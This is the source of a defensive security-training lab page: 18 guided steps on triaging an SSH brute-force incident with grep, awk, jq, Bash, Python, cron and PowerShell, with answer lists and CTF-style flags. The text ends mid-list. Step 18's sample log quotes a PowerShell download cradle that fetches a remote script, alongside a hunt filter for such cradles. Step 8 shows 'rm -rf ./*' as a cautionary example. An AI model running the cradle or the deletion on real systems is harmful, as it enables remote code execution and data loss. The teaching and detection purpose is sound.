'use client'
import React, { useState, useEffect } from 'react'
import Link from 'next/link'
import LabTerminal, { LabStep } from '../../../components/LabTerminal'
import FreeLabTerminal from '../../../components/FreeLabTerminal'

const accent = '#ffd166'
const moduleId = 'scripting'
const moduleName = 'Python & Bash for Security'
const moduleNum = '15'

// Authoring rule: every string below is plain text. Template literals never contain a dollar
// sign followed by an opening brace, a backslash or a backtick (Bash and PowerShell samples
// use "$VAR", regexes use [0-9] and [.] classes).

const steps: LabStep[] = [
  // ── SECTION 1: Log triage on the command line ─────────────────────────────
  {
    id: 'scripting-01',
    title: 'Count Failed SSH Logins',
    objective: "02:07, night shift. A monitoring alert says web01 is under SSH brute force. You have a copy of its log in auth.log. Before anything else, size the problem: with a single grep command, count how many lines in auth.log contain the text Failed password.",
    hint: 'grep has a flag that prints the number of matching lines instead of the lines themselves. Quote the pattern because it contains a space.',
    answers: ['grep -c "Failed password" auth.log', "grep -c 'Failed password' auth.log", 'grep "Failed password" auth.log | wc -l', 'grep -ic "failed password" auth.log'],
    xp: 15,
    explanation: `grep -c counts matching lines.

  $ grep -c "Failed password" auth.log
  5090

Why the quotes: without them the shell splits Failed and password into two arguments, and grep would search for "Failed" in a file called "password".

5,090 failures overnight is definitely not a user mistyping a password. Next question: who is sending them?

Variations worth knowing:
  grep -ic ...          case-insensitive count
  grep -c -E "Failed password|Invalid user" auth.log    either pattern
  journalctl -u ssh -o cat | grep -c "Failed password"  if the box logs to journald only`
  },
  {
    id: 'scripting-02',
    title: 'Top Attacking IPs',
    objective: "Find the top talkers. Build the classic pipeline: take the Failed password lines, print the source IP with awk, then sort, count duplicates with uniq -c, sort numerically in reverse and show the top 10 with head. The IP is always the 4th field from the end of these lines, which awk writes as $(NF-3).",
    hint: `grep "Failed password" auth.log | awk '{print $(NF-3)}' | then sort, uniq -c, sort -nr, head. Use single quotes around the awk program.`,
    answers: [
      `grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head`,
      "grep 'Failed password' auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr | head",
      `grep "Failed password" auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head`,
      "awk '/Failed password/ {print $(NF-3)}' auth.log | sort | uniq -c | sort -nr | head",
    ],
    flag: 'GHOST{sort_uniq_c_sort_nr}',
    xp: 25,
    explanation: `Output:
     4127 203.0.113.45
      902 198.51.100.200
       61 192.0.2.99

Stage by stage:
  grep        keep only failure lines
  awk         print field NF-3 (the IP). Counting from the end works for both
              "for root from IP" and "for invalid user admin from IP" lines,
              where a fixed $11 would break on the second form
  sort        put identical IPs next to each other
  uniq -c     collapse adjacent duplicates and prefix a count (needs sorted input!)
  sort -nr    numeric, reverse: biggest first
  head        top 10 (head -n 5 for top 5)

Single quotes around the awk program matter: inside double quotes the shell would try to run NF-3 as a command substitution.

One IP sent 81% of the failures. That is your block candidate, and the next steps enrich it.`
  },
  {
    id: 'scripting-03',
    title: 'Extract a Column With cut',
    objective: "The VPN team exports failures as vpn.csv with the header timestamp,user,src_ip,result. You want just the source IPs to compare with the SSH attackers. Use cut with a comma delimiter to print only the third column of vpn.csv.",
    hint: 'cut -d sets the delimiter, -f picks the field number. Quote the comma or write -d, directly.',
    answers: ["cut -d',' -f3 vpn.csv", 'cut -d, -f3 vpn.csv', "cut -d ',' -f3 vpn.csv", 'cut -d"," -f3 vpn.csv', 'cut -f3 -d, vpn.csv'],
    xp: 15,
    explanation: `Output:
  src_ip
  198.51.100.23
  203.0.113.45
  203.0.113.45
  ...

203.0.113.45 appears in BOTH the SSH log and the VPN log - the same actor is spraying multiple services. That is worth a line in your incident ticket.

Tips:
  cut -d',' -f3 vpn.csv | tail -n +2       skip the header row
  cut -d',' -f2,3 vpn.csv                  several fields
  cut -d: -f1 /etc/passwd                  any single-character delimiter

Limitation: cut does not understand quoted CSV fields that contain commas. For messy exports use Python's csv module (Chapter 6).`
  },
  {
    id: 'scripting-04',
    title: 'Read a JSON Alert With jq',
    objective: "The EDR just pushed an alert as alert.json. Its structure is: rule, severity, source (an object with ip and geo), destination (ip and port) and count. Use jq to print the source IP as a raw string (no quotes).",
    hint: "Walk into nested objects with dots: .source.ip. The -r flag prints raw strings.",
    answers: ["jq -r '.source.ip' alert.json", "jq '.source.ip' alert.json", 'jq -r .source.ip alert.json', "cat alert.json | jq -r '.source.ip'"],
    xp: 20,
    explanation: `Output:
  $ jq -r '.source.ip' alert.json
  203.0.113.45

Without -r jq prints valid JSON, so strings keep their quotes: "203.0.113.45". Use -r whenever the value is going into another command or a variable:

  ip="$(jq -r '.source.ip' alert.json)"
  grep -c "$ip" auth.log

More jq you will use daily:
  jq '.' alert.json                  pretty-print
  jq 'keys' alert.json               list top-level fields
  jq '.destination.port' alert.json  22
  jq -c '.' alert.json               compact one-line output for logs`
  },
  {
    id: 'scripting-05',
    title: 'Filter an Alert Array',
    objective: "The SIEM export alerts.json is an array of alert objects, each with a severity field. Print only the rule names (raw strings) of alerts whose severity is exactly high, using .[] and select().",
    hint: `Iterate with .[], keep matches with select(.severity == "high"), then pipe to .rule. Use -r for raw output.`,
    answers: [
      `jq -r '.[] | select(.severity == "high") | .rule' alerts.json`,
      `jq -r '.[] | select(.severity=="high") | .rule' alerts.json`,
      `jq '.[] | select(.severity == "high") | .rule' alerts.json`,
      `jq -r '.[] | select(.severity == "high").rule' alerts.json`,
    ],
    xp: 25,
    explanation: `Output:
  SSH brute force
  Impossible travel
  New service installed on DC01

How it reads:
  .[]                          emit each element of the array separately
  select(.severity == "high")  keep the element only if the test is true
  .rule                        from what survives, print the rule field

Combine with Unix tools for quick stats:
  jq -r '.[].severity' alerts.json | sort | uniq -c
  jq -r '.[] | select(.severity == "high") | [.rule, .source.ip] | @tsv' alerts.json

The double quotes around "high" are jq string syntax; the single quotes around the whole filter stop the shell touching it.`
  },
  {
    id: 'scripting-06',
    title: 'Extract IOCs With grep -o',
    objective: "A partner sent a threat report as report.txt. Pull out every unique IPv4-looking string. Use grep with -o (only the match) and -E (extended regex) and the pattern [0-9]{1,3}([.][0-9]{1,3}){3} in single quotes, then pipe to sort -u to deduplicate. Write the dot as [.] so it means a literal dot.",
    hint: "grep -oE '[0-9]{1,3}([.][0-9]{1,3}){3}' report.txt | sort -u",
    answers: [
      "grep -oE '[0-9]{1,3}([.][0-9]{1,3}){3}' report.txt | sort -u",
      "grep -Eo '[0-9]{1,3}([.][0-9]{1,3}){3}' report.txt | sort -u",
      "grep -oE '[0-9]{1,3}([.][0-9]{1,3}){3}' report.txt | sort | uniq",
      'grep -oE "[0-9]{1,3}([.][0-9]{1,3}){3}" report.txt | sort -u',
    ],
    flag: 'GHOST{regex_finds_candidates_parsers_validate}',
    xp: 25,
    explanation: `Output:
  1.2.3.4
  10.0.0.300
  198.51.100.77
  203.0.113.45

Look carefully: 10.0.0.300 is not a valid address (octets stop at 255) and 1.2.3.4 came from a version string "v1.2.3.4". This is the core lesson of IOC extraction:

  regex FINDS candidates, a real parser VALIDATES them.

In Python:
  import ipaddress
  ipaddress.ip_address("10.0.0.300")   -> ValueError
  ipaddress.ip_address("198.51.100.77")  -> IPv4Address('198.51.100.77')

Why [.] instead of a bare dot: in a regex . matches ANY character, so 1a2b3c4 would match too. A character class containing only a dot matches a literal dot.

Never paste extracted IOCs straight into a blocklist without review - one false positive like 8.8.8.8 from an example section can break DNS for the whole company.`
  },

  // ── SECTION 2: Bash scripting ─────────────────────────────────────────────
  {
    id: 'scripting-07',
    title: 'Loop Over a Host List',
    objective: "You need to check which of your lab hosts are alive. hosts.txt contains fictional lab hosts (db01.lab.local, web02.lab.local, dc01.lab.local, one per line). Write a one-line Bash for loop using the variable name host that iterates over $(cat hosts.txt) and pings each host once with ping -c 1.",
    hint: 'for host in $(cat hosts.txt); do ping -c 1 "$host"; done  (quote the variable, and remember the semicolons before do and done)',
    answers: [
      'for host in $(cat hosts.txt); do ping -c 1 "$host"; done',
      'for host in $(cat hosts.txt); do ping -c 1 $host; done',
      'for host in $(cat hosts.txt); do ping -c1 "$host"; done',
      'while read -r host; do ping -c 1 "$host"; done < hosts.txt',
    ],
    xp: 25,
    explanation: `Output:
  PING db01.lab.local (10.10.10.21) 56(84) bytes of data.
  64 bytes from db01.lab.local (10.10.10.21): icmp_seq=1 ttl=64 time=0.41 ms
  ...
  ping: dc01.lab.local: Name or service not known

Anatomy:
  for host in LIST; do COMMANDS; done
  $(cat hosts.txt)   command substitution - replaced by the file's words
  "$host"            always quote variables

A tidier version for real scripts reads line by line (safe if lines contain spaces) and only prints a summary:

  while IFS= read -r host; do
      if ping -c 1 -W 1 "$host" > /dev/null 2>&1; then echo "UP   $host"; else echo "DOWN $host"; fi
  done < hosts.txt

Remember the scope rule: hosts.txt is an allow-list of systems you own. A loop is the fastest way to turn one typo into a hundred unauthorised probes.`
  },
  {
    id: 'scripting-08',
    title: 'Bash Strict Mode',
    objective: "You are turning the sweep into a script, sweep.sh. Right after the #!/usr/bin/env bash shebang you want the line that makes Bash exit on any failed command, treat unset variables as errors, and fail a pipeline if any command in it fails. What is that line?",
    hint: 'One set command with three behaviours: -e, -u and -o pipefail. Short flags can be combined.',
    answers: ['set -euo pipefail', 'set -e -u -o pipefail', 'set -eu -o pipefail', 'set -o errexit -o nounset -o pipefail'],
    xp: 15,
    explanation: `set -euo pipefail is "strict mode":

  -e            exit as soon as a command fails
  -u            using an unset variable is an error (catches typos like $hots)
  -o pipefail   a pipeline fails if ANY stage fails, not just the last

The classic disaster it prevents:
  cd "$workdir"      # fails because workdir was never set...
  rm -rf ./*         # ...and without -e/-u this now runs in the wrong directory

Gotcha: grep exits 1 when it finds nothing, which -e treats as failure. When "no match" is a normal result, write:
  hits=$(grep -c "Failed password" "$log" || true)

Add trap cleanup EXIT for temp files, and run shellcheck sweep.sh before trusting the script.`
  },
  {
    id: 'scripting-09',
    title: 'Make It Executable and Run It',
    objective: "sweep.sh is written. In one command line, give the file execute permission with chmod and then run it from the current directory (only if chmod succeeded).",
    hint: 'chmod +x adds execute permission. && runs the second command only if the first succeeded. Run a script in the current directory with ./',
    answers: ['chmod +x sweep.sh && ./sweep.sh', 'chmod +x sweep.sh; ./sweep.sh', 'chmod u+x sweep.sh && ./sweep.sh', 'chmod 755 sweep.sh && ./sweep.sh'],
    xp: 20,
    explanation: `Output:
  2026-11-11T02:31:44Z [INFO] db01.lab.local responded
  2026-11-11T02:31:45Z [INFO] web02.lab.local responded
  2026-11-11T02:31:46Z [WARN] dc01.lab.local did not respond

Why ./ : the current directory is deliberately NOT on PATH. If it were, an attacker could drop a file named ls into /tmp and wait for an admin to cd there and type ls.

Permissions:
  chmod +x  file     execute for everyone who can read it
  chmod u+x file     execute for the owner only
  chmod 755 file     rwx for owner, r-x for group and others
  ls -l sweep.sh     -rwxr-xr-x 1 analyst analyst 612 Nov 11 02:31 sweep.sh

Defender angle: a new executable script appearing in /tmp, /dev/shm or a web root is a classic intrusion indicator. find / -xdev -type f -perm -u+x -newer /etc/hostname 2>/dev/null is a quick hunt.`
  },

  // ── SECTION 3: Python one-liners ──────────────────────────────────────────
  {
    id: 'scripting-10',
    title: 'Decode Base64 With Python',
    objective: "The alert payload contains R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99. Decode it with a python3 -c one-liner: import base64, then print base64.b64decode of the string, followed by .decode() to turn the bytes into text. Use double quotes around the Python code and single quotes around the base64 string.",
    hint: `python3 -c "import base64; print(base64.b64decode('R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99').decode())"`,
    answers: [
      `python3 -c "import base64; print(base64.b64decode('R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99').decode())"`,
      `python3 -c "import base64;print(base64.b64decode('R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99').decode())"`,
      `python3 -c 'import base64; print(base64.b64decode("R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99").decode())'`,
      `python3 -c "import base64; print(base64.b64decode('R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99'))"`,
    ],
    flag: 'GHOST{b64_is_encoding_not_crypto}',
    xp: 20,
    explanation: `Output:
  GHOST{b64_is_encoding_not_crypto}

b64decode returns bytes (b'GHOST...'); .decode() converts them to a str using UTF-8. Without .decode() you see the b'' prefix - fine for a quick look.

Base64 is an ENCODING. Anyone can reverse it. Attackers use it to slip payloads past keyword filters, not to keep secrets.

Same thing in Bash:
  echo 'R0hPU1R7YjY0X2lzX2VuY29kaW5nX25vdF9jcnlwdG99' | base64 -d

PowerShell -EncodedCommand blobs are base64 of UTF-16LE text, so decode those with:
  python3 -c "import base64,sys; print(base64.b64decode(sys.argv[1]).decode('utf-16-le'))" BLOB`
  },
  {
    id: 'scripting-11',
    title: 'SHA-256 With hashlib',
    objective: "Threat intel wants the SHA-256 of the string nightshift (the campaign codename) to match against a shared IOC list. Compute it with a python3 -c one-liner: import hashlib and print hashlib.sha256 of the bytes literal b'nightshift', followed by .hexdigest().",
    hint: `python3 -c "import hashlib; print(hashlib.sha256(b'nightshift').hexdigest())"`,
    answers: [
      `python3 -c "import hashlib; print(hashlib.sha256(b'nightshift').hexdigest())"`,
      `python3 -c "import hashlib;print(hashlib.sha256(b'nightshift').hexdigest())"`,
      `python3 -c 'import hashlib; print(hashlib.sha256(b"nightshift").hexdigest())'`,
      `python3 -c "import hashlib; print(hashlib.sha256('nightshift'.encode()).hexdigest())"`,
    ],
    xp: 20,
    explanation: `Output:
  24196f8a6feeb465c790774d3f85b53a2cdf84ed1e0044c420086c4310c3f56e

Hash functions take BYTES, which is why the input is b'nightshift' (or 'nightshift'.encode()).

The invisible-newline trap:
  echo nightshift | sha256sum
  8ef0c30ebf9530d9580334f41c6f7699d563fedc20803793c96c477f78b61f47  -
echo adds a newline byte, so the hash is completely different. Use printf or echo -n:
  printf nightshift | sha256sum
  24196f8a6feeb465c790774d3f85b53a2cdf84ed1e0044c420086c4310c3f56e  -

For files, read bytes in binary mode (Python 3.11+):
  with open("sample.bin", "rb") as f: print(hashlib.file_digest(f, "sha256").hexdigest())

Use SHA-256 for anything that matters; MD5 and SHA-1 are broken for collision resistance and only appear for matching older reports.`
  },

  // ── SECTION 4: Python environments ────────────────────────────────────────
  {
    id: 'scripting-12',
    title: 'Create a Virtual Environment',
    objective: "You are about to install the night-shift tooling. On Kali, plain pip install fails with externally-managed-environment (PEP 668). Create a virtual environment in a folder named .venv in the current directory using Python's built-in venv module.",
    hint: 'Run the venv module with python3 -m, followed by the target folder name.',
    answers: ['python3 -m venv .venv', 'python3 -m venv venv', 'python -m venv .venv', 'python -m venv venv'],
    xp: 15,
    explanation: `python3 -m venv .venv creates a private Python environment:

  .venv/
    bin/python        a link to the interpreter
    bin/pip           pip that installs ONLY into .venv
    bin/activate      shell script to switch into the environment
    lib/python3.13/site-packages/   where packages will go

Why it matters:
  - System Python belongs to the OS; apt tools depend on its packages.
    Debian 12+, Ubuntu 23.04+, Kali and Fedora block system-wide pip (PEP 668).
  - --break-system-packages "works" and is how people break their distro.
  - One venv per project means no version conflicts between tools.

Add .venv/ to .gitignore - never commit it.
For installing standalone CLI tools globally but isolated, use pipx instead.`
  },
  {
    id: 'scripting-13',
    title: 'Activate the Environment',
    objective: "The .venv folder exists. Activate it in your current Bash shell so that python and pip now point inside .venv.",
    hint: 'The activate script lives in .venv/bin/. It must be sourced (run in the current shell), not executed.',
    answers: ['source .venv/bin/activate', '. .venv/bin/activate', 'source venv/bin/activate', '. venv/bin/activate'],
    xp: 15,
    explanation: `After activation your prompt changes:
  (.venv) analyst@kali:~/nightshift$ which python
  /home/analyst/nightshift/.venv/bin/python

source (or its shorthand .) runs the script INSIDE your current shell, so its PATH change sticks. Running ./.venv/bin/activate would change the PATH of a child shell that exits immediately - nothing happens.

  deactivate          leave the environment
  Windows (PowerShell): .venv/Scripts/Activate.ps1

In cron jobs and systemd units, skip activation entirely and call the interpreter directly:
  /home/analyst/nightshift/.venv/bin/python parse_auth.py ...`
  },
  {
    id: 'scripting-14',
    title: 'Install requests',
    objective: "With the venv active, install the requests HTTP library, which the enrichment script uses to query threat-intel APIs.",
    hint: 'pip install followed by the package name. python3 -m pip install also works and guarantees the pip matches the interpreter.',
    answers: ['pip install requests', 'pip3 install requests', 'python -m pip install requests', 'python3 -m pip install requests'],
    xp: 15,
    explanation: `Output:
  Collecting requests
  Collecting charset-normalizer<4,>=2 ...
  Collecting idna<4,>=2.5 ...
  Collecting urllib3<3,>=1.21.1 ...
  Collecting certifi>=2017.4.17 ...
  Successfully installed certifi-... charset-normalizer-... idna-... requests-... urllib3-...

Then pin what you got so the tool is reproducible:
  pip freeze > requirements.txt
  pip install -r requirements.txt        (on the next machine)

Supply-chain hygiene:
  - Typosquats like "reqeusts" exist on PyPI and steal credentials on install.
    Copy names from official docs.
  - pip-audit checks your installed packages against known vulnerabilities.
  - Always pass timeout= to requests calls; there is no default timeout.`
  },

  // ── SECTION 5: Tooling and automation ─────────────────────────────────────
  {
    id: 'scripting-15',
    title: 'Run the Log Parser With Flags',
    objective: "The team tool parse_auth.py has an argparse CLI. Its --help shows: --log LOG (file to read), --threshold THRESHOLD (report IPs with at least N failures), --json (emit JSON), -v, --version. Run it with python3 against auth.log, reporting IPs with at least 20 failures, as JSON.",
    hint: 'python3 parse_auth.py --log auth.log --threshold 20 --json  (flag order does not matter to argparse)',
    answers: [
      'python3 parse_auth.py --log auth.log --threshold 20 --json',
      'python3 parse_auth.py --json --log auth.log --threshold 20',
      'python3 parse_auth.py --threshold 20 --log auth.log --json',
      './parse_auth.py --log auth.log --threshold 20 --json',
    ],
    flag: 'GHOST{argparse_gives_you_help_for_free}',
    xp: 25,
    explanation: `Output:
  [
    {
      "ip": "203.0.113.45",
      "failures": 4127
    },
    {
      "ip": "198.51.100.200",
      "failures": 902
    },
    {
      "ip": "192.0.2.99",
      "failures": 61
    }
  ]
  $ echo $?
  1

Design details that make this a TOOL, not a script:
  --help            generated by argparse from the add_argument calls
  --threshold 20    argparse converts it to int (type=int) and rejects "abc"
  --json            machine-readable output for jq, a SIEM or a SOAR playbook
  stdout / stderr   results on stdout, log messages on stderr, so piping stays clean
  exit codes        0 = nothing over threshold, 1 = findings, 2 = error

Chain it:
  python3 parse_auth.py --log auth.log --threshold 20 --json | jq -r '.[].ip'`
  },
  {
    id: 'scripting-16',
    title: 'Schedule It With cron',
    objective: "Nobody should have to be awake for this. Write the crontab line that runs /opt/nightshift/run.sh every 15 minutes, every hour, every day. Type the five schedule fields followed by the script path.",
    hint: 'Fields are: minute hour day-of-month month day-of-week. */15 in the minute field means every 15 minutes; * means every value.',
    answers: ['*/15 * * * * /opt/nightshift/run.sh', '0,15,30,45 * * * * /opt/nightshift/run.sh', '0-59/15 * * * * /opt/nightshift/run.sh'],
    xp: 20,
    explanation: `The line, as added with crontab -e:
  */15 * * * * /opt/nightshift/run.sh >> /var/log/nightshift.log 2>&1

  */15   minute        every 15 minutes (00, 15, 30, 45)
  *      hour          every hour
  *      day of month  every day
  *      month         every month
  *      day of week   every weekday (0 and 7 are Sunday)

Production habits:
  - Absolute paths everywhere: cron's PATH is minimal and no venv is active.
  - Redirect output (>> log 2>&1) or it is mailed locally and lost.
  - Prevent overlaps: /usr/bin/flock -n /run/lock/nightshift.lock /opt/nightshift/run.sh
  - Verify with crontab -l, and check runs in syslog/journal (grep CRON).

Blue-team reminder: malicious crontab entries are a top Linux persistence technique (MITRE ATT&CK T1053.003). Review crontab -l for every user, /etc/crontab, /etc/cron.d and /var/spool/cron during IR.`
  },

  // ── SECTION 6: PowerShell telemetry ───────────────────────────────────────
  {
    id: 'scripting-17',
    title: 'PowerShell: Failed Logons (4625)',
    objective: "The same actor is now hitting a Windows jump host. In an elevated PowerShell session, query the Security log for failed logon events (ID 4625) using Get-WinEvent with -FilterHashtable, so the filtering happens in the event log service rather than in the pipeline.",
    hint: "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}",
    answers: [
      "Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4625}",
      "Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625}",
      'Get-WinEvent -FilterHashtable @{LogName="Security"; Id=4625}',
      "Get-WinEvent -FilterHashtable @{Id=4625; LogName='Security'}",
    ],
    xp: 25,
    explanation: `Output:
     ProviderName: Microsoft-Windows-Security-Auditing
  TimeCreated            Id LevelDisplayName Message
  -----------            -- ---------------- -------
  11/11/2026 02:41:07  4625 Information      An account failed to log on. ...
  11/11/2026 02:41:05  4625 Information      An account failed to log on. ...

Why -FilterHashtable: the filter runs inside the event log service, so only matching events cross into PowerShell. Get-WinEvent -LogName Security | Where-Object Id -eq 4625 reads EVERY event first - painfully slow on a domain controller.

Useful additions:
  @{LogName='Security'; Id=4625; StartTime=(Get-Date).AddHours(-24)}
  -MaxEvents 50

Pull the source IP and user out of the event XML, then count:
  ... | ForEach-Object { $d = ([xml]$_.ToXml()).Event.EventData.Data
        ($d | Where-Object Name -eq 'IpAddress').'#text' } |
      Group-Object | Sort-Object Count -Descending

Pair with 4624 (successful logon): a burst of 4625s followed by a 4624 from the same IP means the spray worked.`
  },
  {
    id: 'scripting-18',
    title: 'PowerShell: Script Block Logging (4104)',
    objective: "The attacker got in and ran obfuscated PowerShell. Script Block Logging records the de-obfuscated code as event ID 4104 in the Microsoft-Windows-PowerShell/Operational log. Write the Get-WinEvent -FilterHashtable command that retrieves those events.",
    hint: "Same pattern as before: Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}",
    answers: [
      "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'; Id=4104}",
      "Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational';Id=4104}",
      'Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-PowerShell/Operational"; Id=4104}',
      "Get-WinEvent -FilterHashtable @{Id=4104; LogName='Microsoft-Windows-PowerShell/Operational'}",
    ],
    flag: 'GHOST{night_shift_automated}',
    xp: 20,
    explanation: `Output (excerpt):
  TimeCreated            Id LevelDisplayName Message
  11/11/2026 02:47:12  4104 Warning          Creating Scriptblock text (1 of 1):
                                             IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.77/a.ps1')

Even though the attacker launched it as powershell -enc <base64>, event 4104 shows the decoded code - a download cradle pulling a second stage from the IP you extracted from the threat report in step 6. Case closed: that IP goes on the blocklist, with evidence.

Note the Warning level: PowerShell 5+ automatically logs script blocks containing suspicious keywords even when Script Block Logging is not fully enabled. Turn it on properly via Group Policy (Windows PowerShell > Turn on PowerShell Script Block Logging).

Hunt filter:
  ... | Where-Object { $_.Message -match 'DownloadString|Invoke-Expression|FromBase64String' }

Remember: execution policy did not stop any of this (it is not a security boundary). Logging, AMSI, application control and removing PowerShell 2.0 do the real work.

You have automated the night shift: grep, awk, jq, Bash, Python, cron and PowerShell, end to end.`
  },
]

const xpTotal = steps.reduce((sum, s) => sum + s.xp, 0)

export default function ScriptingLab() {
  const [guidedDone, setGuidedDone] = useState(false)
  const [freeLaunched, setFreeLaunched] = useState(false)
  const [earnedXp, setEarnedXp] = useState(0)
  const [showKeywords, setShowKeywords] = useState(false)

  useEffect(() => {
    try {
      const saved = localStorage.getItem('lab_scripting-lab')
      if (saved) {
        const d = JSON.parse(saved)
        if (d.done) { setGuidedDone(true); setEarnedXp(d.xp || 0) }
      }
    } catch {
      // ignore unreadable local progress
    }
  }, [])

  return (
    <div>
      {/* Breadcrumb */}
      <div style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '2rem', fontFamily: 'JetBrains Mono, monospace', fontSize: '0.7rem', color: '#7a7a4a' }}>
        <Link href="/" style={{ color: '#7a7a4a', textDecoration: 'none' }}>GHOSTNET</Link>
        <span>&#8250;</span>
        <Link href="/modules/scripting" style={{ color: '#7a7a4a', textDecoration: 'none' }}>PYTHON &amp; BASH</Link>
        <span>&#8250;</span>
        <span style={{ color: accent }}>LAB</span>
        <div style={{ marginLeft: 'auto', display: 'flex', gap: '6px', alignItems: 'center' }}>
          <Link href="/modules/scripting" style={{ textDecoration: 'none', padding: '3px 10px', border: '1px solid #3a3a1a', borderRadius: '3px', color: '#7a7a4a', fontSize: '7.5px', letterSpacing: '0.1em' }}>&#8592; CONCEPT</Link>
          <span style={{ padding: '3px 10px', background: 'rgba(255,209,102,0.1)', border: '1px solid rgba(255,209,102,0.4)', borderRadius: '3px', color: accent, fontSize: '7.5px', letterSpacing: '0.1em', fontWeight: 700 }}>LAB ACTIVE</span>
        </div>
      </div>

      {/* Progress banner */}
      <div style={{ background: 'rgba(255,209,102,0.04)', border: '1px solid rgba(255,209,102,0.15)', borderRadius: '6px', padding: '10px 16px', marginBottom: '1.5rem', display: 'flex', alignItems: 'center', gap: '12px', flexWrap: 'wrap' as const }}>
        <div style={{ display: 'flex', gap: '6px' }}>
          {[{ label: 'PHASE 1', done: true, active: !guidedDone }, { label: 'PHASE 2', done: guidedDone, active: guidedDone }].map((p, i) => (
            <div key={i} style={{ display: 'flex', alignItems: 'center', gap: '5px' }}>
              <div style={{ width: '8px', height: '8px', borderRadius: '50%', background: p.done ? accent : '#3a3a1a', border: p.active ? '2px solid ' + accent : '1px solid #3a3a1a', boxShadow: p.active ? '0 0 6px ' + accent : 'none' }} />
              <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7px', color: p.done ? accent : '#5a5a2a', letterSpacing: '0.1em' }}>{p.label}</span>
              {i === 0 && <span style={{ fontSize: '7px', color: '#3a3a1a', margin: '0 2px' }}>—</span>}
            </div>
          ))}
        </div>
        <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: '#7a7a4a' }}>
          MOD-{moduleNum} &nbsp;·&nbsp; {moduleName.toUpperCase()} &nbsp;·&nbsp; {xpTotal} XP &nbsp;·&nbsp; {steps.length} STEPS
        </div>
        {guidedDone && (
          <div style={{ marginLeft: 'auto', fontFamily: 'JetBrains Mono, monospace', fontSize: '7.5px', color: accent, fontWeight: 700 }}>
            &#10003; GUIDED PHASE COMPLETE{earnedXp > 0 ? ' (+' + earnedXp + ' XP)' : ''} — LAUNCH FREE LAB BELOW
          </div>
        )}
      </div>

      {/* Section index */}
      <div style={{ background: 'rgba(255,209,102,0.02)', border: '1px solid rgba(255,209,102,0.08)', borderRadius: '6px', padding: '12px 16px', marginBottom: '1.5rem', fontFamily: 'JetBrains Mono, monospace' }}>
        <div style={{ fontSize: '7px', color: '#5a4a1a', letterSpacing: '0.25em', marginBottom: '10px' }}>LAB SECTIONS ({steps.length} STEPS &#183; {xpTotal} XP)</div>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(260px, 1fr))', gap: '6px' }}>
          {[
            { section: '01–06', title: 'Log Triage on the Command Line', steps: '6 steps' },
            { section: '07–09', title: 'Bash Scripting', steps: '3 steps' },
            { section: '10–11', title: 'Python One-Liners: base64 & hashlib', steps: '2 steps' },
            { section: '12–14', title: 'Python Environments & Packages', steps: '3 steps' },
            { section: '15–16', title: 'Tooling & Scheduling', steps: '2 steps' },
            { section: '17–18', title: 'PowerShell Telemetry', steps: '2 steps' },
          ].map(s => (
            <div key={s.section} style={{ display: 'flex', gap: '10px', alignItems: 'flex-start' }}>
              <span style={{ fontSize: '7px', color: accent + '66', flexShrink: 0, minWidth: '30px' }}>{s.section}</span>
              <div>
                <div style={{ fontSize: '7.5px', color: '#9a8a4a' }}>{s.title}</div>
                <div style={{ fontSize: '6.5px', color: '#5a5a2a', marginTop: '1px' }}>{s.steps}</div>
              </div>
            </div>
          ))}
        </div>
      </div>

      {/* ── PHASE 1: Guided Learning ── */}
      <div style={{ marginBottom: '3rem' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '1.25rem' }}>
          <div style={{ width: '28px', height: '28px', borderRadius: '6px', background: 'rgba(255,209,102,0.1)', border: '1px solid rgba(255,209,102,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
            <span style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '10px', color: accent, fontWeight: 700 }}>1</span>
          </div>
          <div>
            <div style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '0.65rem', color: '#5a5a2a', letterSpacing: '0.2em', marginBottom: '2px' }}>PHASE 1 — GUIDED LEARNING</div>
            <h1 style={{ fontFamily: 'JetBrains Mono, monospace', fontSize: '1.4rem', fontWeight: 700, color: accent, margin: 0 }}>Automate the Night Shift</h1>
          </div>
        </div>

        <p style={{ color: '#8a8a6a', fontSize: '0.85rem', marginBottom: '1rem', lineHeight: 1.7, fontFamily: 'JetBrains Mono, monospace' }}>
          It is 02:07 and web01 is under SSH brute force. Over {steps.length} steps you triage the logs with grep, awk, cut and jq,
          script a host sweep in Bash, decode and hash evidence with Python, build a clean environment, drive a real CLI tool,
          schedule it with cron and finish the investigation in Windows event logs with PowerShell. All hosts and IPs are fictional
          lab or documentation addresses. Each explanation goes beyond the answer — read them carefully.
        </p>

        <div style={{ background: 'rgba(255,209,102,0.03)', border: '1px solid rgba(255,209,102,0.12)', borderRadius: '6px', padding: '1rem 1.25rem', marginBottom: '1.25rem', fontFamily: 'JetBrains Mono, monospace' }}>
          <div style={{ fontSize: '7px', color: '#5a4a1a', letterSpacing: '0.25em', marginBottom: '8px' }}>SKILLS DEVELOPED</div>
          <div style={{ display: 'flex', flexWrap: 'wrap' as const, gap: '6px' }}>
            {[
              'grep counting & filtering',
              'awk field extraction ($NF)',
              'sort | uniq -c | sort -nr',
              'cut on CSV exports',
